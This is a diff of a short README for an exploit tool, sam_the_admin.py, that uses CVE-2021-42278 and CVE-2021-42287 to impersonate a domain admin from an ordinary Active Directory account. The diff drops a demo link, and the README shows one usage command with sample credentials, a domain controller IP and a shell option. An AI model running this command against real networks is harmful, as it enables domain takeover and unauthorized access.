@@ -1,7 +1,5 @@
 Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user 
 
-[![asciicast](https://asciinema.org/a/SnQ66XtmZLzXZQ8QwWwAYs8Dm.svg)](https://asciinema.org/a/SnQ66XtmZLzXZQ8QwWwAYs8Dm)
-
 usage:
 
 python3 sam_the_admin.py "domainname/John:Admin@123" -dc-ip 172.16.242.135 -shell
